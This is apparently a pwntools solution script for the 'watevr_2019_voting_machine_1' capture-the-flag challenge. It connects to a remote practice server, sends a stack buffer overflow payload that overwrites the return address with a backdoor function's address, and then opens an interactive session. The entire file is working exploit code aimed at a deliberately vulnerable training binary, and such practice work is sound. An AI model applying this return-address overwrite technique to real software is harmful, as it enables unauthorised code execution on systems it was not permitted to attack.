from pwn import *

context(log_level='debug')

#io=process("./watevr_2019_voting_machine_1")
io=remote("node3.buuoj.cn",28630)
io.recv()

backdoor=0x400807

payload=b'A'*(0x2+0x8)+p64(backdoor)

io.sendline(payload)

io.recv()

io.interactive()